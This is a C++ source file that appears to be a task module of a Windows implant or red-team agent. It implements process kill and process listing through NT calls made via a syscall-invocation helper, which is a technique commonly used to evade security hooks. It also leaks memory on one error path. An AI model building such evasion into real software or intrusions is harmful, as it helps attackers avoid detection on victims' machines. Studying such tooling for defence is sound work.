#include "core/task.hpp"

namespace Task
{
    std::wstring PsKill(State::PSTATE pState, const std::wstring& wPid)
    {
        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);

        HANDLE hProcess = System::Process::ProcessOpen(
            pState->pProcs,
            dwPid,
            PROCESS_TERMINATE
        );
        if (!hProcess)
        {
            return L"Error: Could not open the process.";
        }

        if (!System::Process::ProcessTerminate(pState->pProcs, hProcess, EXIT_SUCCESS))
        {
            pState->pProcs->lpNtClose(hProcess);
            return L"Error: Could not terminte the process.";
        }

        pState->pProcs->lpNtClose(hProcess);

        return L"Success: Process has been terminated.";
    }

    std::wstring PsLs(
        State::PSTATE pState,
        const std::wstring& wFilter,
        const std::wstring& wExclude
    ) {
        NTSTATUS status;
        ULONG bufferSize = 0;

        status = CallSysInvoke(
            &pState->pProcs->sysNtQuerySystemInformation,
            pState->pProcs->lpNtQuerySystemInformation,
            Nt::SystemProcessInformation,
            nullptr,
            0,
            &bufferSize
        );
        if (status != STATUS_INFO_LENGTH_MISMATCH)
        {
            return L"Error: Failed to query system process information.";
        }

        PVOID buffer = malloc(bufferSize);
        if (!buffer)
        {
            return L"Error: Failed to allocate memory.";
        }

        status = CallSysInvoke(
            &pState->pProcs->sysNtQuerySystemInformation,
            pState->pProcs->lpNtQuerySystemInformation,
            Nt::SystemProcessInformation,
            buffer,
            bufferSize,
            nullptr
        );
        if (status != STATUS_SUCCESS)
        {
            return L"Error: Failed to query system process information.";
        }

        // Parse process information
        Nt::PSYSTEM_PROCESS_INFORMATION pProcessInfo = reinterpret_cast<Nt::PSYSTEM_PROCESS_INFORMATION>(buffer);
        std::wstring wProcesses = L"";
        std::wstring wPID = L"";
        std::wstring wProcessName = L"";
        BOOL bAdd = TRUE;
        std::wstring wCurrentPID = Utils::Convert::DWORDToWstring(GetCurrentProcessId());
        while (pProcessInfo)
        {
            wPID = std::to_wstring(reinterpret_cast<ULONG_PTR>(pProcessInfo->UniqueProcessId));
            wProcessName = std::wstring(pProcessInfo->ImageName.Buffer, pProcessInfo->ImageName.Length / sizeof(wchar_t));

            if (wFilter == L"" && wExclude == L"")
            {
                bAdd = TRUE;
            }
            else
            {
                if (wFilter != L"" && wProcessName.find(wFilter) == std::wstring::npos)
                {
                    bAdd = FALSE;
                }
                else if (wExclude != L"" && wProcessName.find(wExclude) != std::wstring::npos)
                {
                    bAdd = FALSE;
                }
                else
                {
                    bAdd = TRUE;
                }
            }

            if (bAdd)
            {
                if (wPID == wCurrentPID)
                    wProcesses += L"*";
                else
                    wProcesses += L" ";

                wProcesses += wPID + L"\t";
                wProcesses += wProcessName + L"\n";
            }

            if (pProcessInfo->NextEntryOffset == 0)
            {
                break;
            }
            pProcessInfo = reinterpret_cast<Nt::PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<BYTE*>(pProcessInfo) + pProcessInfo->NextEntryOffset);
        }

        free(buffer);

        if (wProcesses == L"")
        {
            return L"Error: Failed to get processes.";
        }

        // Finally, preprend the header in the output.
        std::wstring wHeader = L" PID\tName\n";
        std::wstring wHeaderBar = L" ---\t----\n";

        return wHeader + wHeaderBar + wProcesses;
    }
}